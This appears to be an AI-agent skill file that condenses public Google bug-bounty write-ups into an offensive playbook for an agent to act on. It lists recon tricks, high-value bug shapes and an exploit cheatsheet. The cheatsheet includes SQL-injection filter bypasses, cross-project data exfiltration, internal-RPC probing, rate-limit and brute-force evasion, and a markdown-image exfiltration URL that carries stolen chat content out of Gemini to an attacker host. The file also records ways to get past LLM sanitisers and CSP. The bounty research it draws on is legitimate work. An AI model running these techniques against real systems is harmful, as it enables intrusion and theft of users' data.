---
name: google-vrp-playbook
description: Use when testing Google products or Google-style API infra.
---

# GOOGLE VRP PLAYBOOK — patterns from 22 public Google VRP writeups ($5k–$165k, 2017-2026)

Studied set: brutecat (YouTube email/phone $10k/$20k/$5k, decoding-google), Michaeldalton Google Support $14k, Valentino Gemini multi-layer $20k, RyotaK Looker RCE (flatt.tech), Tenable Looker RCE + Looker Studio LeakyLooker (9 vulns), ezequiel GAE $36k + Deployment Manager $165k total, landh/dep AI hack $50k, obmi Cloud Shell $20k, balintmagyar Web Designer 3× client-side RCE, matt Google Home $107k, sudistark IDX $22k, missoumsai mass CSRF $30k, nechudav SSRF $31k, oauth token steal $5k. Corpus: /home/kali/vrp-study/txt/ + /tmp/gvrp.csv (273-writeup index: xdavidhu/awesome-google-vrp-writeups).

## CORE DOCTRINE (what actually pays at Google)

1. **Convert black box → white box.** Every big bug started with enumerating the FULL hidden API surface (discovery docs, protobuf schema dumps, JS extraction). The API used by the frontend is 10-20% of the real surface (support case: 14 frontend methods vs 93 in discovery doc).
2. **Layered-architecture discrepancy hunting.** Google products are 3-5 layers (proto → sanitizer → renderer → bridge product → auth). Same input parsed at each layer differently = the bug. Don't test ONE parser; map the pipeline, then hunt layer-skew.
3. **Minimal-surface method:** take a working authenticated request, DELETE parameters one by one until it breaks → minimal request → then substitute IDs/resources from your own history and walk the whole discovery doc checking authorization per method.
4. **Error messages are the API spec.** Wrong-type params leak full parameter names/types (`Invalid value at 'browse_id' (TYPE_STRING), 1`). Insufficient-scope 403s leak the full scope list AND gRPC method name. "not-exist" errors can be faked for real methods — differential the "method absent" vs "method present but no access" error paths.
5. **Staging/test/dogfood are real attack surface.** `*-pa.sandbox.googleapis.com` (staging), `staging-*/test-*` envs, `dogfood` API versions, `alpha` versions. A key found in one product often unlocks the STAGING variant of another. Discovery docs on staging contain MORE (comments, internal descriptions).
6. **Mobile/Android auth is a different, weaker trust context.** Android refresh token (via EmbeddedSetup oauth_token → android.googleapis.com/auth exchange) + app package name + client_sig = bearer token in the CONTEXT OF ANY GOOGLE APP's cloud project → project-context-specific extra permissions you can't get from web.
7. **The victim's credentials executing attacker logic = 0/1-click class** (Looker Studio owner-credentials 0-click SQLi, NATIVE_DIMENSION viewer-credential 1-click SQLi, Bard/Gemini workspace exfil, CSRF file upload to Cloud Shell). Always ask: which credential mode does this action use, and can a VIEWER trigger a mutation under OWNER creds (or vice versa)?
8. **CSRF/file-upload-to-execution paths:** file upload endpoints without CSRF that write to user-executable paths (`.bash_profile`, editor lib dir) = persistence chain. Cloud Shell class.
9. **Client-side app (desktop/mobile) RCE via malicious content files** — Web Designer: preview-copy follows symlinks planted in archive (CWE-59) → arbitrary write → RCE; URL parsing path traversal in ad URLs; CSS injection in Electron-ish editor. Pattern: app renders user-supplied ad/project files with weak path/fs handling.
10. **Physical-proximity IoT attacks chain to Internet-persistent control** (Google Home): local API leaks device "password" (cloud_device_id+cert) over LAN/setup-mode (forced via deauth, device lacks 802.11w) → attacker links own account remotely → routines = arbitrary scheduled device commands (`call <number>` = mic wiretap); Local Home SDK test mode opens CDP port 9222 → LAN pivoting + arbitrary file RW.

## GOOGLE-SPECIFIC RECON TECHNIQUES (the "Decoding Google" toolkit)

- **Discovery documents**: `GET https://<service>.googleapis.com/$discovery/rest` with `X-Goog-Api-Key` from any product's JS. Private API keys are hardcoded in client JS (`apiKey:"AIza..."`) — grep every google.com page's JS. If PERMISSION_DENIED on enable, the key from a product that uses that API works.
- **Hidden discovery via visibility labels**: append `?labels=PANTHEON` (and other secret labels) to discovery doc → extra hidden methods (214KB → 329KB example).
- **Staging discovery**: `staging-<service>.sandbox.googleapis.com` + Referer of the originating google product + API key.
- **ProtoJson format abuse**: `Content-Type: application/json+protobuf` accepts ARRAY instead of named fields → send numbers 1..N to dump EVERY parameter name+type via 400 error. Tool: **req2proto** (converts any captured request into full .proto schema). Works on youtubei.googleapis.com etc. Find "secret hidden parameters" this way (e.g. `include_suspended` on studio get_creator_channels leaked content owner emails).
- **SAPISIDHASH auth**: Cookie + `Authorization: SAPISIDHASH <timestamp>_<hmac>` — replayable ~1h; scripts exist to regenerate.
- **clients6.google.com = googleapis.com alias** (cookie-based API auth).
- **Android refresh-token bearer tokens**: `POST android.googleapis.com/auth` with `app=<pkg>&client_sig=<sha1>&service=<scopes>&Token=<aas_et>` — insufficient_scope error lists needed scopes; gives app-cloud-project context.
- **Internal RPC infrastructure** (GAE pattern): 169.254.169.253:10001/rpc_http (Proto over HTTP), port-4 gRPC, stubby.Send, app_config_service, blade: internal DNS names. From any app-code-execution context, enumerate hidden APIs by extracting .proto defs from JARs/binaries and checking command-line args of runtime launchers (`--api_call_deadline_map=` lists internal API names).
- **Gaia ID leaks**: block-user flows, moderation params (base64+protobuf double-encoded in `params=`) — Gaia ID → email via old forgotten Google products (Pixel Recorder etc). Chain: YouTube channel → Gaia ID → email.
- **Rate-limit notes**: IPv6 /64 rotation (reqwest local_address) defeats IP-based limits; No-JS recovery form accepted BotGuard token from JS form (`bgresponse=<bgtoken>` instead of `js_disabled`) — token had no per-request limit. Display-name leak via Looker Studio ownership transfer (0 interaction). libphonenumber national-format masks fingerprint country + area codes to shrink keyspace (brute 40k req/s on $0.30/hr box).

## HIGH-VALUE BUG SHAPES (with $)

| Shape | Example | $ |
|---|---|---|
| Public report → owner-cred SQL injection (BI tools, 0-click) | Looker Studio alias injection (`/**/` for spaces, `CHR(46)`+CONCAT for dots) | high |
| Copy-report keeps stored JDBC credentials in the copy | attacker becomes owner of copy with victim's creds | high |
| NATIVE_DIMENSION raw-SQL field + keyword filter bypass (`SEL/**/ECT`) | 1-click cross-tenant BigQuery exfil via cross-project log "ping" per char | high |
| Hidden params in InnerTube endpoints (req2proto dump) | YouTube creator email leak | 20k |
| Discovery doc on internal API + pathless-endpoint authz gap | changes:list global dump of support PII | 14k |
| Git hooksPath config injection via dependency name traversal | Looker RCE chain (dir-create + race) | high |
| rm_rf on validated-but-root path ("/") + concurrent git ops → forge config in worktree → fsmonitor hook exec | Looker RCE | high |
| Deployment Manager dogfood `googleOptions` + GSLB `gslbTarget`/descriptorUrl → internal requests | GCP RCE | 165k total |
| GAE sandbox → internal RPC (stubby/app_config_service) from non-prod env | GAE RCE | 36k |
| GraphQL `@Signature` directive overloading (sign-everything-except-signatures flaw) → backend DoS | Cloud Console | 6k |
| Markdown image exfil w/ CSP bypass: `![x](https://www.google.com/amp/s/evil...)` (AMP open redirect inside allowlist) + URL-encoded domain to dodge SSRF-domain filter | Bard/Gemini Workspace exfil | 20k |
| Gemini linkifier: `!` not treated as hostname char → prefix-`!` converts linkified URL to un-sanitized image | sanitizer bypass | dup |
| Colab bridge: `[](https:)<unescaped>` confuses escape layer during export | Colab exfil | 20k |
| VSCode webWorkerExtensionHostIframe `parentOrigin=` param control → postMessage proxy to extension worker | IDX/GitLab XSS | 22k |
| CSRF file upload → `~/.bash_profile` write; `uri` param reflected in text/html response → XSS; webview `state` param via postMessage → script injection; NEL report-uri capture of OAuth token in 503 URLs | Cloud Shell | 20k |
| OAuth token steal via markdown/XSS in editor → token in URL | Cloud Shell | 5k |
| Preview symlink-follow (CWE-59) → arbitrary file overwrite → shell profile persistence | Web Designer | 11k |
| URL-parsing traversal in ad-URL handling (Windows) | Web Designer | 8.5k |
| CSS injection → Electron client RCE | Web Designer | 3.5k |
| Local API + setup-mode (deauth, no 802.11w) → cloud_device_id+cert leak → remote account link → `call` routine mic exfil; Local Home SDK test-mode CDP 9222 | Google Home | 107k |
| InnerTube moderation `params` (double-b64 protobuf) contains Gaia ID of ANY channel | YouTube email chain | 10k/20k |
| BotGuard token replay across forms + IPv6 rotation | phone brute | 5k |
| SAPISIDHASH + discovery doc on private API; pathless methods skip middleware authz | support leak | 14k |

## EXPLOIT RECIPE CHEATSHEET

```text
# SQLi filter bypasses (BigQuery/Looker style)
SEL/**/ECT — comments as whitespace through space-stripping filters
CHR(46)+CONCAT() — build forbidden chars (.) at runtime, post-filter
BEGIN...END; DECLARE; WHILE; EXECUTE IMMEDIATE — full scripting in one injection
EXFIL via cross-project table "pings": SELECT * FROM attacker_project.exfil-<char>
  then reconstruct from attacker-side GCP logs (audit log channel, no data perms needed)
# Attacker tables must be queryable cross-project; attacker reads own audit logs.

# 0-click via owner credentials (BI platforms): find the request a report fires on load
# (batchedDataV2), find user-controlled strings concatenated into generated SQL (column aliases),
# break out. Public report = victim trigger; shared report = 1-click.

# Gemini/LLM markdown exfil under CSP:
https://www.google.com/amp/s/<attacker>.bc.googleusercontent.com/svg%3fdata={CONTENT}
(URL-encode letters of the domain to bypass domain-string checks; CSP allows *.google.com;
 /amp/ path = open redirect inside allowlist)

# InnerTube param dump
POST /youtubei/v1/browse  Content-Type: application/json+protobuf
[1,2,3,...,30]   → 400 error lists every field name/type at each position

# GAE-internal probe (from app code exec)
nmap static binary in /tmp; port 4 gRPC; apphosting.APIRequest JSON-PB;
stubby.GetStubId {host:"blade:<service>"} → stub_id → stubby.Send
/ServerStatus.GetServices = service+method lister
```

## REPORT-VALUE TACTICS (from award rationales)

- Appeal lowballed rewards with the program's OWN rubric (probability/likelihood axis): no-prereq + victim-undetectable = higher likelihood class (brutecat phone: $1,337 → $5,000 after citing the table).
- Impact framing for PII leaks: add the PHISHING scenario (call right after support call with agent name = near-perfect pretext), not just "PII leak".
- Abuse-category bugs (info leak without code exec) can still reach $5k-20k when chained cross-product.
- Timing: brand-new feature launches (Bard Extensions) are 20-minute windows — watch announcements and hunt immediately (rez0's DM landed 20 min after release).
- Keep hunting after "fixed": re-attack after fix, other endpoints (obmi: same CSRF 5k+5k), bridge to other products (Gemini→Colab).

## MINDSET NOTES

- Ezequiel: multi-week slow grind, error-message differentials to detect lying "not exist" errors, protobuf enum counting to discover hidden enum values, `staging_` prefix + `$outputDefaults` system param.
- brutecat: "find ALL endpoints + ALL parameters, especially hidden ones left from dev testing".
- Valentino: read Orange Tsai + Kettle research for multi-layer inspiration; bridge = context-escape between products that parse differently.
- Tenable: decouple the two auth paths of a feature (owner vs viewer credentials) and attack each independently.
- RyotaK: reverse-engineer the self-hosted version of a SaaS product to find the bug that then pays on the SaaS.
- When security middleware checks resource IDs IN PATH but the method has no path ID → prioritize those methods for missing authz (support case pattern).
